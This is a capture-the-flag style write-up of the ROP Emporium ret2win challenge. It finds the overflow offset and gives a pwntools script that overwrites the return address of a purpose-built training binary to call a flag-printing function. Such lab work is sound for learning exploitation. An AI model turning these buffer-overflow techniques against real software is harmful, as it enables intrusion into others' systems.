## ROP Emporium Solutions
ROP Emporium is a web page for learning return-oriented programming through a series of challenges. In this post, we are going to solve all the challenges.

## ret2win
You can download the binary here: https://ropemporium.com/binary/ret2win.zip

We start executing the binary to see the output:

![image](https://github.com/user-attachments/assets/f2c6075a-2e4a-4f9e-a33a-cf3b6f190d8c)

It says that the buffer is 32 bytes long. Let's check it out!

![image](https://github.com/user-attachments/assets/a0734009-bf89-419b-81c2-9cfcfc97ebde)

We see that we have a segmentation fault. We have to find the offset for RIP:

![image](https://github.com/user-attachments/assets/957f6fa3-7da9-4cda-99fc-715e3482cd6f)

![image](https://github.com/user-attachments/assets/3ff907e5-06ad-481e-b260-f78446ef14b0)

![image](https://github.com/user-attachments/assets/0248e03a-9279-4525-8659-325243e46300)

So if we add "8" bytes plus "32" bytes, we have "40" bytes to overwrite the RIP.

And now? We disassemble the "main" function:

![image](https://github.com/user-attachments/assets/0fcffa46-4fe2-41e2-85c6-efecb945d41c)

We see a "pwnme" interesting function...

![image](https://github.com/user-attachments/assets/8d6e5508-08db-40dd-8f5a-eeb52dc0699d)

Here we can see the "memset" and "read" functions so here is where the vulnerability is found. We need to call a function to print the flag. We are gonna check the imported functions:

![image](https://github.com/user-attachments/assets/8ee79bfc-c3a1-4a67-9d44-93b11099e7de)

We see the function "ret2win".

![image](https://github.com/user-attachments/assets/56da11f4-8f04-4dc4-b42a-c7141dd2b328)

![image](https://github.com/user-attachments/assets/a19794bb-01db-4401-a639-69217e034631)

This function calls "cat flag.txt" so it is interesting. We create the exploit:

```python
from pwn import *

elf = context.binary = ELF('./ret2win')

ret2win = elf.symbols['ret2win']

p = process(elf.path)

offset = 40
filler = b"A" * offset
payload = filler + p64(ret2win)

p.sendline(payload)

p.interactive()
```

And we receive the flag!

![image](https://github.com/user-attachments/assets/bdf77cb5-82dd-44ae-8cd9-08b351c8c06a)

